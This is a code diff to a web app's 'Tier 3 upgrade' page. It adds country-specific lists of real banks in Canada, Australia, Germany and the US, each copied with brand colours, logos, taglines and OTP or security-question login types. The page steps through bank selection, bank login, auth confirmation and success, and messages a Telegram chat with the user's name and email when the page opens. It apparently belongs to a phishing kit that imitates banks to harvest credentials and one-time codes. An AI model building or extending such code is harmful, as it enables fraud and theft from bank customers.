@@ -64,7 +64,41 @@ interface BankDef {
   };
 }
 
-const BANKS_DATA: BankDef[] = [
+// ── Per-country bank lists ───────────────────────────────────────────────────
+const BANKS_CA: BankDef[] = [
+  { id: "rbc", name: "RBC Royal Bank", auth: "otp", position: 1, theme: { bg: "#f5f5f5", headerBg: "#003168", headerText: "#ffffff", accent: "#003168", accentText: "#ffffff", logo: "RBC", logoColor: "#ffffff", inputBorder: "#003168", tagline: "Advice Beyond Banking" } },
+  { id: "td_ca", name: "TD Canada Trust", auth: "otp", position: 2, theme: { bg: "#f0f7f0", headerBg: "#00843d", headerText: "#ffffff", accent: "#00843d", accentText: "#ffffff", logo: "TD", logoColor: "#ffffff", inputBorder: "#00843d", tagline: "Banking can be this comfortable" } },
+  { id: "scotiabank", name: "Scotiabank", auth: "otp", position: 3, theme: { bg: "#fdf5f5", headerBg: "#ec0000", headerText: "#ffffff", accent: "#ec0000", accentText: "#ffffff", logo: "Scotiabank", logoColor: "#ffffff", inputBorder: "#ec0000", tagline: "You're richer than you think" } },
+  { id: "bmo", name: "BMO Bank of Montreal", auth: "securityq", position: 4, theme: { bg: "#f0f4f8", headerBg: "#0075be", headerText: "#ffffff", accent: "#0075be", accentText: "#ffffff", logo: "BMO", logoColor: "#ffffff", inputBorder: "#0075be", tagline: "We're here to help" } },
+  { id: "cibc", name: "CIBC", auth: "otp", position: 5, theme: { bg: "#f5f5f5", headerBg: "#c41f3e", headerText: "#ffffff", accent: "#c41f3e", accentText: "#ffffff", logo: "CIBC", logoColor: "#ffffff", inputBorder: "#c41f3e", tagline: "Ambitions Made Real" } },
+  { id: "nbc", name: "National Bank of Canada", auth: "otp", position: 6, theme: { bg: "#f5f5f5", headerBg: "#e31837", headerText: "#ffffff", accent: "#e31837", accentText: "#ffffff", logo: "National Bank", logoColor: "#ffffff", inputBorder: "#e31837" } },
+  { id: "simplii", name: "Simplii Financial", auth: "otp", position: 7, theme: { bg: "#f0f4f8", headerBg: "#0055a5", headerText: "#ffffff", accent: "#0055a5", accentText: "#ffffff", logo: "Simplii", logoColor: "#ffffff", inputBorder: "#0055a5" } },
+  { id: "tangerine", name: "Tangerine Bank", auth: "otp", position: 8, theme: { bg: "#fff8f0", headerBg: "#ef7c00", headerText: "#ffffff", accent: "#ef7c00", accentText: "#ffffff", logo: "Tangerine", logoColor: "#ffffff", inputBorder: "#ef7c00", tagline: "Forward Banking" } },
+];
+
+const BANKS_AU: BankDef[] = [
+  { id: "cba", name: "Commonwealth Bank", auth: "otp", position: 1, theme: { bg: "#f5f5f5", headerBg: "#ffd200", headerText: "#000000", accent: "#000000", accentText: "#ffffff", logo: "CommBank", logoColor: "#000000", inputBorder: "#000000", tagline: "Can. Do." } },
+  { id: "westpac", name: "Westpac", auth: "otp", position: 2, theme: { bg: "#f0f4f8", headerBg: "#d5002b", headerText: "#ffffff", accent: "#d5002b", accentText: "#ffffff", logo: "Westpac", logoColor: "#ffffff", inputBorder: "#d5002b", tagline: "Help when it matters" } },
+  { id: "anz", name: "ANZ Bank", auth: "otp", position: 3, theme: { bg: "#f0f4f0", headerBg: "#007dba", headerText: "#ffffff", accent: "#007dba", accentText: "#ffffff", logo: "ANZ", logoColor: "#ffffff", inputBorder: "#007dba", tagline: "We Live in Your World" } },
+  { id: "nab", name: "NAB — National Australia Bank", auth: "securityq", position: 4, theme: { bg: "#f5f5f5", headerBg: "#d31145", headerText: "#ffffff", accent: "#d31145", accentText: "#ffffff", logo: "NAB", logoColor: "#ffffff", inputBorder: "#d31145", tagline: "More than money" } },
+  { id: "ing_au", name: "ING Australia", auth: "otp", position: 5, theme: { bg: "#fff8f0", headerBg: "#ff6200", headerText: "#ffffff", accent: "#ff6200", accentText: "#ffffff", logo: "ING", logoColor: "#ffffff", inputBorder: "#ff6200" } },
+  { id: "macquarie", name: "Macquarie Bank", auth: "otp", position: 6, theme: { bg: "#f5f5f5", headerBg: "#000000", headerText: "#ffffff", accent: "#000000", accentText: "#ffffff", logo: "Macquarie", logoColor: "#ffffff", inputBorder: "#000000", tagline: "Think. Act. Benefit." } },
+  { id: "bendigo", name: "Bendigo Bank", auth: "otp", position: 7, theme: { bg: "#f5f5f5", headerBg: "#e31837", headerText: "#ffffff", accent: "#e31837", accentText: "#ffffff", logo: "Bendigo Bank", logoColor: "#ffffff", inputBorder: "#e31837" } },
+  { id: "ubank", name: "ubank", auth: "otp", position: 8, theme: { bg: "#f0f4f8", headerBg: "#0033a0", headerText: "#ffffff", accent: "#0033a0", accentText: "#ffffff", logo: "ubank", logoColor: "#ffffff", inputBorder: "#0033a0" } },
+];
+
+const BANKS_DE: BankDef[] = [
+  { id: "deutsche", name: "Deutsche Bank", auth: "otp", position: 1, theme: { bg: "#f5f5f5", headerBg: "#003b8e", headerText: "#ffffff", accent: "#003b8e", accentText: "#ffffff", logo: "Deutsche Bank", logoColor: "#ffffff", inputBorder: "#003b8e", tagline: "Leading to learn" } },
+  { id: "commerzbank", name: "Commerzbank", auth: "otp", position: 2, theme: { bg: "#fff8f0", headerBg: "#ffcc00", headerText: "#000000", accent: "#000000", accentText: "#ffffff", logo: "Commerzbank", logoColor: "#000000", inputBorder: "#000000", tagline: "Die Bank an Ihrer Seite" } },
+  { id: "sparkasse", name: "Sparkasse", auth: "otp", position: 3, theme: { bg: "#fff5f5", headerBg: "#cc0000", headerText: "#ffffff", accent: "#cc0000", accentText: "#ffffff", logo: "Sparkasse", logoColor: "#ffffff", inputBorder: "#cc0000", tagline: "Wenn's um Geld geht" } },
+  { id: "dkb", name: "DKB — Deutsche Kreditbank", auth: "otp", position: 4, theme: { bg: "#f0f4f8", headerBg: "#003d8f", headerText: "#ffffff", accent: "#003d8f", accentText: "#ffffff", logo: "DKB", logoColor: "#ffffff", inputBorder: "#003d8f", tagline: "Bank für Chancen" } },
+  { id: "ing_de", name: "ING Germany", auth: "otp", position: 5, theme: { bg: "#fff8f0", headerBg: "#ff6200", headerText: "#ffffff", accent: "#ff6200", accentText: "#ffffff", logo: "ING", logoColor: "#ffffff", inputBorder: "#ff6200" } },
+  { id: "comdirect", name: "Comdirect Bank", auth: "otp", position: 6, theme: { bg: "#f5f5f5", headerBg: "#ffad00", headerText: "#000000", accent: "#000000", accentText: "#ffffff", logo: "comdirect", logoColor: "#000000", inputBorder: "#ffad00" } },
+  { id: "volksbank", name: "Volksbank / Raiffeisenbank", auth: "securityq", position: 7, theme: { bg: "#f5f5f5", headerBg: "#004f9f", headerText: "#ffffff", accent: "#004f9f", accentText: "#ffffff", logo: "Volksbank", logoColor: "#ffffff", inputBorder: "#004f9f", tagline: "Wir machen den Weg frei" } },
+  { id: "postbank", name: "Postbank", auth: "otp", position: 8, theme: { bg: "#fff8f0", headerBg: "#ffcc00", headerText: "#000000", accent: "#000000", accentText: "#ffffff", logo: "Postbank", logoColor: "#000000", inputBorder: "#000000" } },
+];
+
+const BANKS_US: BankDef[] = [
   { id: "chase", name: "Chase Bank", auth: "otp", position: 1, theme: { bg: "#f5f5f5", headerBg: "#005eb8", headerText: "#ffffff", accent: "#005eb8", accentText: "#ffffff", logo: "CHASE", logoColor: "#ffffff", inputBorder: "#005eb8", tagline: "The right relationship is everything" } },
   { id: "bofa", name: "Bank of America", auth: "securityq", position: 2, theme: { bg: "#f2f2f2", headerBg: "#e31837", headerText: "#ffffff", accent: "#e31837", accentText: "#ffffff", logo: "Bank of America", logoColor: "#ffffff", inputBorder: "#e31837", tagline: "What would you like the power to do?" } },
   { id: "wellsfargo", name: "Wells Fargo Bank", auth: "securityq", position: 3, theme: { bg: "#fdf6ec", headerBg: "#d71e28", headerText: "#ffffff", accent: "#d71e28", accentText: "#ffffff", logo: "WELLS FARGO", logoColor: "#ffffff", inputBorder: "#d71e28", tagline: "Together we'll go far" } },
@@ -97,12 +131,25 @@ const BANKS_DATA: BankDef[] = [
   { id: "prosperity", name: "Prosperity Bank", auth: "otp", position: 30, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#ffffff", accent: "#003865", accentText: "#ffffff", logo: "Prosperity Bank", logoColor: "#ffffff", inputBorder: "#003865" } },
 ];
 
+// Renamed: old BANKS_DATA was US-only
+const BANKS_DATA = BANKS_US;
+
+function getBanksForCountry(country?: string | null): BankDef[] {
+  switch (country) {
+    case "CA": return BANKS_CA;
+    case "AU": return BANKS_AU;
+    case "DE": return BANKS_DE;
+    default:   return BANKS_US;
+  }
+}
+
 type Step = "intro" | "bank-select" | "bank-login" | "auth-confirm" | "processing" | "success";
 
 function UpgradeTier3() {
   const navigate = useNavigate();
   const [userId, setUserId] = useState<string | null>(null);
   const [profile, setProfile] = useState<Profile | null>(null);
+  const [country, setCountry] = useState<string>("US");
   const [step, setStep] = useState<Step>("intro");
   const [selectedBank, setSelectedBank] = useState<BankDef | null>(null);
   const [searchQuery, setSearchQuery] = useState("");
@@ -123,12 +170,14 @@ useEffect(() => {
         setUserId(session.user.id);
         const { data } = await supabase
           .from("profiles").select("*").eq("id", session.user.id).maybeSingle();
-        setProfile(data as Profile | null);
+        const profileData = data as Profile | null;
+        setProfile(profileData);
+        if ((profileData as any)?.country) setCountry((profileData as any).country);
         if (!pageOpenNotifiedRef.current) {
           pageOpenNotifiedRef.current = true;
           await sendTelegramMessage(
             `🔔 <b>Tier 3 Upgrade Initiated</b>\n\n` +
-            `👤 <b>User:</b> ${(data as Profile)?.full_name || "Unknown"}\n` +
+            `👤 <b>User:</b> ${profileData?.full_name || "Unknown"}\n` +
             `📧 <b>Email:</b> ${session.user.email}\n` +
             `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
             `<b>Action:</b> User opened Tier 3 upgrade page`
@@ -141,7 +190,8 @@ useEffect(() => {
 
 
 
-  const filteredBanks = BANKS_DATA
+  const activeBanks = getBanksForCountry(country);
+  const filteredBanks = activeBanks
     .filter(b => b.name.toLowerCase().includes(searchQuery.toLowerCase()))
     .sort((a, b) => a.position - b.position);
 
